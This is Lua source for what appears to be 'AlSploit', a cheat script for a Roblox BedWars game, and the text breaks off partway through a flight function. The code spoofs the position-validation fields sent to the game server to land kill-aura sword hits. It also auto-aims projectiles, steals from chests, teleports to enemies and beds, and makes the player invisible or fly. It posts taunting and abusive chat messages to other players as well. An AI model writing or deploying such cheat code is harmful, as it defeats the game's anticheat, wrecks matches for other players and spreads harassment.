local SendMessageRemote = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local DamageBlockRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@easy-games"):WaitForChild("block-engine"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DamageBlock")
local ProjectileRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ProjectileFire")
local ElkSummonRemote = ReplicatedStorage:WaitForChild("events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"):WaitForChild("useAbility")
local PlayAgainRemote = ReplicatedStorage:WaitForChild("events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events")
local EquipItemRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("SetInvItem")
local GroundHitRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("GroundHit")
local DamageIndicator = KnitClient.Controllers.DamageIndicatorController.spawnDamageIndicator
local SwordController = KnitClient.Controllers.SwordController
local ProjectileMeta = require(ReplicatedStorage.TS.projectile["projectile-meta"]).ProjectileMeta
local SwordHitRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("SwordHit")
local CombatConstant = require(ReplicatedStorage.TS.combat["combat-constant"]).CombatConstant
local PlacementCPS = require(game.ReplicatedStorage.TS["shared-constants"]).CpsConstants
local ReportRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ReportPlayer")
local MinerRemote = ReplicatedStorage:WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("DestroyPetrifiedPlayer")

local KnockBackTable = debug.getupvalue(require(ReplicatedStorage.TS.damage["knockback-util"]).KnockbackUtil.calculateKnockbackVelocity, 1)
local ItemTable = debug.getupvalue(require(ReplicatedStorage.TS.item["item-meta"]).getItemMeta, 1)

local BlockPlacementController = KnitClient.Controllers.BlockPlacementController
local ZephyrController = KnitClient.Controllers.WindWalkerController
local SprintController = KnitClient.Controllers.SprintController
local FovController = KnitClient.Controllers.FovController

local InventoryUtil = require(ReplicatedStorage.TS.inventory["inventory-util"]).InventoryUtil
local ItemTable = debug.getupvalue(require(ReplicatedStorage.TS.item["item-meta"]).getItemMeta, 1)

local KillAuraAnimationCooldown = true
local AnticheatDisabled = false
local InfiniteFlyValue = false
local FlyBodyVelocity = nil
local SpoofedCamera = nil
local AntiVoidPart = nil
local DamageBoost = false
local StartLevel = nil
local ZephyrOrb = 0
local FlyValue = false
local FlyDown = false
local FlyUp = false

local Animations = {
	KillAura = {
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Time = 0.25},
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.25}
	}
}

local function CollectEnderChestItems()
	local EnderChest = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name .. "_personal")

	for i, v in next, EnderChest:GetChildren() do
		if v:IsA("Accessory") and (v.Name == "emerald" or v.Name == "iron" or v.Name == "diamond" or v.Name == "gold") then
			ChestGetItemRemote:InvokeServer(EnderChest, v)
		end
	end
end

local function SecureEnderChestItems()
	local EnderChest = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name .. "_personal")
	local Inventory = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name)

	if Inventory then
		for i, v in next, Inventory:GetChildren() do
			if v:IsA("Accessory") and (v.Name == "emerald" or v.Name == "iron" or v.Name == "diamond" or v.Name == "gold") then
				ChestGiveItemRemote:InvokeServer(EnderChest, v)
			end
		end
	end	
end

local function TweenToNearestPlayer()
	if IsAlive(LocalPlayer) then
		local NearestPlayer = FindNearestPlayer()

		if NearestPlayer then
			local TweenInformation = TweenInfo.new(0.65, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)	
			local PlayerTpTween = TweenService:Create(LocalPlayer.Character.PrimaryPart, TweenInformation, {CFrame = NearestPlayer.Character.PrimaryPart.CFrame + Vector3.new(0, 2, 0)})

			PlayerTpTween:Play()
		end
	end
end

local function FindPetrifiedPlayer()
	for i, v in next, WorkSpace:GetChildren() do		
		if v:GetAttribute("PetrifyId") then
			return v
		end
	end
end

local function CreateSpoofedCamera()
	SpoofedCamera = Instance.new("Part", WorkSpace)
	SpoofedCamera.Anchored = true
	SpoofedCamera.Transparency = 1
	SpoofedCamera.Position = LocalPlayer.Character.Head.Position

	return SpoofedCamera
end

function FindNearestPlayer(MaxDistance)
	local NearestPlayerDistance = MaxDistance or math.huge
	local NearestPlayer

	for i, v in next, PlayerService:GetPlayers() do
		if IsAlive(v) and v ~= LocalPlayer and IsAlive(LocalPlayer) and v.Team ~= LocalPlayer.Team then
			local Distance = (v.Character.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < NearestPlayerDistance then
				NearestPlayerDistance = Distance
				NearestPlayer = v				
			end
		end
	end

	return NearestPlayer, NearestPlayerDistance
end

local function FindNearestEntity(MaxDistance)
	local MaxDistance = MaxDistance or math.huge
	
	local NearestEntityDistance = MaxDistance
	local NearestEntity = nil
	local IsNotAPlayer = true

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("DiamondGuardian") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance and  Distance <= MaxDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end 
		end
	end)

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("GolemBoss") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance and Distance <= MaxDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end
		end
	end)	

	task.spawn(function()
		for i, v in next, CollectionService:GetTagged("Monster") do
			if v.PrimaryPart then
				local Distance = (v.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance and Distance <= MaxDistance then
					NearestEntityDistance = Distance
					NearestEntity = v
				end
			end
		end
	end)

	task.spawn(function()
		for i, v in next, PlayerService:GetPlayers() do
			if IsAlive(v) and v ~= LocalPlayer and v.Team ~= LocalPlayer.Team then
				local Distance = (v.Character.PrimaryPart.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

				if Distance < NearestEntityDistance and Distance <= MaxDistance then
					NearestEntityDistance = Distance
					NearestEntity= v
					IsNotAPlayer = false
				end
			end
		end
	end)

	if NearestEntity then	
		return (IsNotAPlayer and NearestEntity or NearestEntity.Character), NearestEntityDistance
	end

	return nil
end

local function TweenToNearestBed()
	if IsAlive(LocalPlayer) then
		local NearestBed = FindNearestBed()

		if NearestBed then
			local TweenInformation = TweenInfo.new(0.65, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)	
			local BedTpTween = TweenService:Create(LocalPlayer.Character.PrimaryPart, TweenInformation, {CFrame = NearestBed.CFrame + Vector3.new(0, 10, 0)})

			BedTpTween:Play()
		end
	end
end

local function GetServerPosition(Position)
	local X = math.round(Position.X / 3)
	local Y = math.round(Position.Y / 3)
	local Z = math.round(Position.Z / 3)

	return Vector3.new(X, Y, Z)
end

local function FindNearestChest(MaxDistance)
	local NearestChest = nil
	local MaxDistance = MaxDistance or math.huge

	for i, v in next, CollectionService:GetTagged("chest") do
		if v:FindFirstChild("ChestFolderValue") then
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				NearestChest = v
				MaxDistance = Distance				
			end
		end
	end

	return NearestChest:FindFirstChild("ChestFolderValue")
end

function ShootProjectile(Item, Projectile)
	local NearestPlayer = FindNearestPlayer()

	if NearestPlayer then
		local Args = {
			[1] = Item,
			[2] = Projectile,
			[3] = Projectile,
			[4] = NearestPlayer.Character.PrimaryPart.Position,
			[5] = NearestPlayer.Character.PrimaryPart.Position,
			[6] = Vector3.new(0, -25, 0),
			[7] = HttpService:GenerateGUID(true),
			[8] = {["drawDurationSeconds"] = 0.96, ["shotId"] = HttpService:GenerateGUID(false)},
			[9] = (WorkSpace:GetServerTimeNow() - 0.11)
		}

		ProjectileRemote:InvokeServer(unpack(Args))
	end
end

local function SendChatMessage(Message)
	local Arguments = {
		[1] = Message,
		[2] = "All"
	}

	SendMessageRemote:FireServer(unpack(Arguments))
end

function FindNearestBed(MaxDistance)
	local MaxDistance = MaxDistance or math.huge
	local NearestBed = nil

	for i, v in next, WorkSpace:GetDescendants() do
		if v.Name:lower() == "bed" and v:FindFirstChild("Covers") and v:FindFirstChild("Covers").BrickColor ~= LocalPlayer.Team.TeamColor then
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MaxDistance then
				MaxDistance = Distance
				NearestBed = v
			end
		end
	end

	return NearestBed
end

local function FindNearestNpc(MaxDistance)
	local MaxDistance = MaxDistance or math.huge
	local NearestNpc = nil

	for i, v in next, CollectionService:GetTagged("BedwarsItemShop") do
		local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

		if Distance < MaxDistance then
			MaxDistance = Distance
			NearestNpc = v		
		end
	end

	return NearestNpc
end

function FindNearestOre(MaxDistance)
	local MinDistance = MaxDistance or math.huge
	local NearestOre = nil

	for i, v in next, CollectionService:GetTagged("block") do
		if v.Name == "iron_ore" then
			local Distance = (v.Position - LocalPlayer.Character.PrimaryPart.Position).Magnitude

			if Distance < MinDistance then
				MinDistance = Distance
				NearestOre = v
			end
		end
	end

	return NearestOre
end

function TouchingGround()
	if IsAlive(LocalPlayer) then
		local Parameters = RaycastParams.new()
		Parameters.FilterType = Enum.RaycastFilterType.Include
		Parameters.FilterDescendantsInstances = {CollectionService:GetTagged("block")}

		local IsTouchingFloor = false

		for x = 1, 1 do
			local Origin = LocalPlayer.Character.PrimaryPart.Position + Vector3.new(x, 0, 0)

			local Raycast = WorkSpace:Raycast(Origin, Vector3.new(0, -2.5, 0), Parameters)
			if Raycast and Raycast.Instance then
				IsTouchingFloor = true			
			end
		end	

		return IsTouchingFloor
	end
end

function SetCollisions(Value)
	if Value == true then
		if IsAlive(LocalPlayer) then
			for i, v in next, (LocalPlayer.Character:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CanCollide = true
					v.CanTouch = true
				end			
			end
		end
	end

	if Value == false then
		for i, v in next, (LocalPlayer.Character:GetDescendants()) do
			if v:IsA("BasePart") and v ~= LocalPlayer.Character.PrimaryPart and v.CanCollide then
				v.CanCollide = false
				v.CanTouch = false
			end
		end
	end
end

local function GetMatchState()
	return ClientHandlerStore:getState().Game.matchState
end

local function HashFunction(Value)
	return {value = Value}
end

local function DecimalRound(Number, DigitsPast0)
	DigitsPast0 = math.pow(10, DigitsPast0 or 0)

	Number = Number * DigitsPast0

	if Number >= 0 then 
		Number = math.floor(Number + 0.5) 
	end
	
	if Number < 0 then
		Number = math.ceil(Number - 0.5) 
	end

	return Number / DigitsPast0
end

local function GetQueueType()
	local State = ClientHandlerStore:getState()

	return State.Game.queueType or "bedwars_test"
end

function KillHumanoid(Time)
	local Time = Time or 0

	if LocalPlayer:FindFirstChild("leaderstats") and LocalPlayer.leaderstats:FindFirstChild("Bed") then
		if LocalPlayer.leaderstats.Bed.Value == "✅" then
			LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)

			ResetCharacterRemote:FireServer()
		end
	end
end

local function GetInventory(Player)
	local Player = Player or LocalPlayer

	local Inventory = InventoryUtil.getInventory(Player).items

	return Inventory
end

local function PurchaseItem(Arguments)
	PurchaseItemRemote:InvokeServer(unpack(Arguments))
end

local function Invisibility()
	repeat task.wait() until GetMatchState() ~= 0 and IsAlive(LocalPlayer)

	task.wait(0.3)

	local Animation = Instance.new("Animation")
	local Id = 11335949902

	Animation.AnimationId = "rbxassetid://".. Id

	local PlayerAnimation = LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Animation)

	if PlayerAnimation then
		LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
		LocalPlayer.Character.PrimaryPart.Size = Vector3.new(2, 3, 1.1)

		PlayerAnimation.Priority = Enum.AnimationPriority.Action4
		PlayerAnimation.Looped = false

		LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)	
		LocalPlayer.Character.PrimaryPart.Transparency = 0.6
		LocalPlayer.Character.PrimaryPart.Size = Vector3.new(2, 3, 1.1)

		SetCollisions(false)

		task.spawn(function()
			repeat
				task.wait()

				PlayerAnimation:Play(1 / 999999, 999999, 1 / 999999)
			until Settings.Invisible.Value == false or not IsAlive(LocalPlayer)

			if PlayerAnimation then
				PlayerAnimation:Destroy()
			end

			if Animation then
				Animation:Destroy()
			end

			if IsAlive(LocalPlayer) then
				SetCollisions(true)

				LocalPlayer.Character.PrimaryPart.Size = Vector3.new(1.9, 2, 1)
				LocalPlayer.Character.PrimaryPart.Transparency = 1
				LocalPlayer.Character.Humanoid.CameraOffset = Vector3.new(0, 0, 0)
			end
		end)
	end
end

local function SwitchItem(Item)
	if LocalPlayer.Character.HandInvItem.Value ~= Item then
		local InventoryItem = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild(Item)
		
		EquipItemRemote:InvokeServer({hand = InventoryItem})
	end	
end

local function PlaceBlock(Position, Block)
	BlockPlacingRemote:InvokeServer({["blockType"] = Block, ["blockData"] = 0,["position"] = Position})
end

local function StealChest(NearestChest)	
	NearestChest = NearestChest and NearestChest.Value or nil				

	local Chestitems = NearestChest and NearestChest:GetChildren()

	if #Chestitems > 1 then
		SetObservedChestRemote:FireServer("BlockChest")

		for i2, v2 in next, Chestitems do
			if v2:IsA("Accessory") then
				task.spawn(function()
					ChestGetItemRemote:InvokeServer(NearestChest, v2)
				end)
			end
		end

		task.wait(0.001)

		SetObservedChestRemote:FireServer(nil)
	end
end

local function CreateCape(DecalId)
	local Cape = Instance.new("Part")

	Cape.Parent = LocalPlayer.Character
	Cape.Name = "Cape"
	Cape.Size = Vector3.new(0.2, 0.2, 0.08)
	Cape.Material = Enum.Material.SmoothPlastic
	Cape.Color = Color3.new(0.105882, 0.105882, 0.105882)
	Cape.CanCollide = false

	local BlockMesh = Instance.new("BlockMesh")

	BlockMesh.Parent = Cape
	BlockMesh.Name = "Mesh"
	BlockMesh.Scale = Vector3.new(9, 17.5, 0.5)
	BlockMesh.VertexColor = Vector3.new(1, 1, 1)

	local Motor = Instance.new("Motor")

	Motor.Parent = Cape
	Motor.Name = "Motor"
	Motor.C0 = CFrame.new(0, 2, 0, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08)
	Motor.C1 = CFrame.new(0, 1, 0.449999988, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08)
	Motor.Part1 = LocalPlayer.Character.UpperTorso
	Motor.Part0 = Cape
	Motor.CurrentAngle = -0.16208772361278534
	Motor.DesiredAngle = -0.1002269834280014

	local Decal = Instance.new("Decal")

	Decal.Parent = Cape
	Decal.Name = "Decal"
	Decal.Face = Enum.NormalId.Back
	Decal.Texture = DecalId
end

function SetCamera(Camera)
	WorkSpace.CurrentCamera.CameraSubject = Camera
end

local function AutoToxic(Player)
	local Randomized = math.random(0, 5)
	local KillMessage = ""					

	if Randomized == 0 then
		KillMessage = "You are so bad u died. L" .. Player.Name .. " | AlSploit on top"
	end

	if Randomized ~= 0 then
		KillMessage = "I could probably win without cheats. L" .. Player.Name .. " | AlSploit on top"
	end

	if Randomized == 2 then
		KillMessage = "Clowns are the only ones we kill. L" .. Player.Name .. " | AlSploit on top"
	end

	if Randomized == 3 then
		KillMessage = "Rats. Imagine dying in a block game. L" .. Player.Name .. " | AlSploit on top"
	end

	if Randomized == 4 then
		KillMessage = "I hack for fun. Too bad your fun is ruined. L" .. Player.Name .. " | AlSploit on top"
	end

	if Randomized == 5 then
		KillMessage = "I ruined a good day for a good reason. L" .. Player.Name .. " | AlSploit on top"
	end

	SendChatMessage(KillMessage)
end

local function GetSword()
	local HighestDamage, Sword = -math.huge, nil

	for i, v in next, GetInventory(LocalPlayer) do 
		local SwordMetaGame = ItemTable[v.itemType].sword

		if SwordMetaGame then
			local SwordDamage = SwordMetaGame.damage / SwordMetaGame.attackSpeed

			if SwordDamage > HighestDamage then
				HighestDamage = SwordDamage
				Sword = v
			end
		end
	end

	return Sword
end

function IsMoving()	
	local Position = LocalPlayer.Character.PrimaryPart.Position

	task.wait(0.001)

	if IsAlive(LocalPlayer) and LocalPlayer.Character.PrimaryPart.Position ~= Position then
		Position = LocalPlayer.Character.PrimaryPart.Position
		
		return true
	end

	if IsAlive(LocalPlayer) and LocalPlayer.Character.PrimaryPart.Position == Position then
		Position = LocalPlayer.Character.PrimaryPart.Position
		
		return false
	end
end

local function ChatSpam()
	local Randomized = math.random(0, 5)
	local KillMessage = ""

	if Randomized == 0 then
		KillMessage = "AlSploit does more updates than Bedwars 💀. | AlSploit On Top"
	end

	if Randomized ~= 0 then
		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | AlSploit On Top"
	end

	if Randomized == 2 then
		KillMessage = "Switch to AlSploit, ez wins. | AlSploit On Top"
	end

	if Randomized == 3 then
		KillMessage = "I am not cheating, my gaming chair is. | AlSploit On Top"
	end

	if Randomized == 4 then
		KillMessage = "3 years now, and the anticheat is still the same. | AlSploit On Top"
	end

	if Randomized == 5 then
		KillMessage = "Kids in bedwars just keep getting worst. | AlSploit On Top"
	end

	SendChatMessage(KillMessage)
end

local function AutoBank()
	local NearestNpc = FindNearestNpc(Settings.AutoBank.Range)

	if NearestNpc then
		CollectEnderChestItems()
	end
	
	if not NearestNpc then
		SecureEnderChestItems()
	end
end

local function FpsBoost()
	for i, v in next, CollectionService:GetTagged("block") do
		if v:GetAttribute("PlacedByUserId") == 0 then
			v.Material = Enum.Material.SmoothPlastic

			for i2, v2 in next, (v:GetDescendants()) do
				if v2:IsA("BasePart") then
					v2.Material = Enum.Material.SmoothPlastic
				end
			end
		end
	end
end

function GetSpeed()
	local Speed = 0

	if IsAlive(LocalPlayer) then 

		local SpeedDamageBoost =  LocalPlayer.Character:GetAttribute("SpeedBoost")

		if SpeedDamageBoost and SpeedDamageBoost > 1 then 
			Speed = Speed + (20 * (SpeedDamageBoost - 1))
		end

		if LocalPlayer.Character:GetAttribute("SpeedPieBuff") then 
			Speed = Speed + 5
		end

		if LocalPlayer.Character:GetAttribute("GrimReaperChannel") then 
			Speed = Speed + 20
		end

		if ZephyrOrb ~= 0 then
			Speed = Speed + 19
		end

		if DamageBoost == true then
			Speed = Speed + 18
		end

		if AnticheatDisabled == true then
			Speed = Speed + 12
		end

		Speed = ((Speed + Settings.Speed.Speed) - 20)
	end

	return Speed
end

function GetBlock()
	for i, v in next, GetInventory(LocalPlayer) do
		if ItemTable[v.itemType].block ~= nil and v.itemType:find("wool") then
			return v.itemType
		end
	end
end

local function HasItem(Name)
	for i, v in next, GetInventory(LocalPlayer) do
		if v.itemType:find(Name) then
			return v 
		end
	end	

	return nil
end

function AutoBuy()
	local NearestNpc = FindNearestNpc(30)

	if NearestNpc then		
		local Wool = {
			[1] = {
				["shopItem"] = {
					["currency"] = "iron",
					["itemType"] = "wool_white",
					["amount"] = 16,
					["price"] = 8,
					["category"] = "Blocks"
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local EmeraldArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "emerald_chestplate",
					["price"] = 40,
					["customDisplayName"] = "Emerald Armor",
					["currency"] = "emerald",
					["category"] = "Combat",
					["nextTier"] = "",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "emerald_helmet",
						[2] = "emerald_chestplate",
						[3] = "emerald_boots"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local DiamondArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "Diamond_chestplate",
					["price"] = 8,
					["customDisplayName"] = "Diamond Armor",
					["currency"] = "emerald",
					["category"] = "Combat",
					["nextTier"] = "diamond_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "diamond_helmet",
						[2] = "diamond_chestplate",
						[3] = "diamond_boots"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}
		local IronArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "iron_chestplate",
					["price"] = 120,
					["customDisplayName"] = "Iron Armor",
					["currency"] = "iron",
					["category"] = "Combat",
					["nextTier"] = "diamond_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "iron_helmet",
						[2] = "iron_chestplate",
						[3] = "iron_boots"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local LeatherArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "leather_chestplate",
					["price"] = 50,
					["customDisplayName"] = "Leather Armor",
					["currency"] = "iron",
					["category"] = "Combat",
					["nextTier"] = "iron_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "leather_helmet",
						[2] = "leather_chestplate",
						[3] = "leather_boots"
					},
					["amount"] = 1
				},
				["shopId"] = NearestNpc.Name
			}
		}

		local EmeraldSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "emerald_sword",
					["price"] = 20,
					["superiorItems"] = {
						[1] = ""
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = "1_item_shop"
			}
		}

		local DiamondSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "diamond_sword",
					["price"] = 4,
					["superiorItems"] = {
						[1] = "emerald_sword"
					},
					["currency"] = "emerald",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = "1_item_shop"
			}
		}

		local IronSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "iron_sword",
					["price"] = 70,
					["superiorItems"] = {
						[1] = "diamond_sword"
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = "1_item_shop"
			}
		}

		local StoneSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "stone_sword",
					["price"] = 20,
					["superiorItems"] = {
						[1] = "iron_sword"
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = "1_item_shop"
			}
		}

		task.spawn(function()
			if HasItem("diamond_sword") then
				PurchaseItem(EmeraldSword)
			end

			if HasItem("iron_sword") or HasItem("stone_sword") or HasItem("wood_sword") then
				PurchaseItem(DiamondSword)
			end

			if HasItem("stone_sword") and HasItem("iron_chestplate") then
				PurchaseItem(IronSword)
			end

			if HasItem("wood_sword") then
				PurchaseItem(StoneSword)
			end
		end)

		task.spawn(function()
			if HasItem("diamond_chestplate") then
				PurchaseItem(EmeraldArmor)
			end	

			if HasItem("iron_chestplate") then
				PurchaseItem(DiamondArmor)
			end	

			if HasItem("leather_chestplate") then
				PurchaseItem(IronArmor)
			end	

			if HasItem("stone_sword") then
				PurchaseItem(LeatherArmor)
			end		
		end)

		task.spawn(function()
			if HasItem("iron_chestplate") and HasItem("iron_sword") and Settings.Scaffold.Value == true then
				PurchaseItem(Wool)
			end
		end)
	end	
end

function AutoKit()
	local FindPetrifiedPlayer = FindPetrifiedPlayer()
	local NearestPlayer = FindNearestPlayer(math.huge)

	task.spawn(function()
		if IsAlive(LocalPlayer) and NearestPlayer then
			HannahPromptTriggerRemote:CallServer({victimEntity = NearestPlayer.Character, ["user"] = LocalPlayer})
		end
	end)

	task.spawn(function()
		if FindPetrifiedPlayer then
			MinerRemote:SendToServer({
				petrifyId = FindPetrifiedPlayer:GetAttribute("PetrifyId")
			})
		end
	end)

	task.spawn(function()
		TrinitySetAngelTypeRemote:FireServer({angel = "Void"})
	end)
end

function IsAlive(Player)
	Player = Player or LocalPlayer

	if not Player.Character then return false end
	if not Player.Character:FindFirstChild("Humanoid") then return false end
	if Player.Character:GetAttribute("Health") <= 0 then return false end
	if not Player.Character.PrimaryPart then return false end	

	return true
end	

local function SwordHit(Entity, Weapon)
	local LocalPlayerHumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
	local EntityPrimaryPart = Entity.PrimaryPart

	local SelfPosition = LocalPlayerHumanoidRootPart.Position + (20 > 14 and (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude > 14.4 and (CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector * ((LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude - 14)) or Vector3.zero)

	task.spawn(function()
		if KillAuraAnimationCooldown and Settings.KillAura.CustomAnimation == true then
			KillAuraAnimationCooldown = false

			for i, v in next, Animations.KillAura do
				local AnimationTween = TweenService:Create(Camera.Viewmodel.RightHand.RightWrist, TweenInfo.new(v.Time), {C0 = OrigC0 * v.CFrame}):Play()

				task.wait(v.Time - 0.01)
			end

			KillAuraAnimationCooldown = true
		end
	end)

	task.spawn(function()
		if Settings.KillAura.ToolCheck == false then
			task.spawn(function()
				SwitchItem(Weapon.itemType)
			end)
			
			SelfPosition = LocalPlayerHumanoidRootPart.Position + (20 > 14 and (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude > 14.4 and (CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector * ((LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude - 14)) or Vector3.zero)

			SwordHitRemote:FireServer({
				weapon = Weapon.tool,
				chargedAttack = {chargeRatio = 0},
				entityInstance = Entity,
				validate = {
					raycast = {
						cameraPosition = HashFunction(LocalPlayerHumanoidRootPart.Position), 
						cursorDirection = HashFunction(CFrame.new(SelfPosition, EntityPrimaryPart.Position).lookVector)
					},
					targetPosition = HashFunction(EntityPrimaryPart.Position),
					selfPosition = HashFunction(SelfPosition)
				}
			})
		end

		if Settings.KillAura.ToolCheck == true then
			if HasItem(Weapon.itemType) then
				SelfPosition = LocalPlayerHumanoidRootPart.Position + (20 > 14 and (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude > 14.4 and (CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector * ((LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude - 14)) or Vector3.zero)

				SwordHitRemote:FireServer({
					weapon = Weapon.tool,
					chargedAttack = {chargeRatio = 0},
					entityInstance = Entity,
					validate = {
						raycast = {
							cameraPosition = HashFunction(LocalPlayerHumanoidRootPart.Position), 
							cursorDirection = HashFunction(CFrame.new(SelfPosition, EntityPrimaryPart.Position).lookVector)
						},
						targetPosition = HashFunction(EntityPrimaryPart.Position),
						selfPosition = HashFunction(SelfPosition)
					}
				})
			end
		end
	end)
end

function GetBow()
	local BestBow, BestBowDamage = nil, 0

	for i, v in next, GetInventory(LocalPlayer) do
		if v.itemType:find("bow") then 
			local Item = ItemTable[v.itemType].projectileSource
			local Arrow = Item.projectileType("arrow")	
			local Damage = ProjectileMeta[Arrow].combat.damage

			if Damage > BestBowDamage then
				BestBowDamage = Damage
				BestBow = v
			end
		end
	end	

	return BestBow, BestBowDamage
end

local function InfFly()
	if InfiniteFlyValue == true and IsAlive(LocalPlayer) then
		SpoofedCamera = CreateSpoofedCamera()
		StartLevel = LocalPlayer.Character.Head.Position.Y

		if SpoofedCamera then
			SetCamera(SpoofedCamera)
		end

		LocalPlayer.Character.PrimaryPart.CFrame += Vector3.new(0, 1000000, 0)
		SpoofedCamera.Position = Vector3.new(SpoofedCamera.Position.X, StartLevel, SpoofedCamera.Position.Z)

		repeat 
			task.wait()

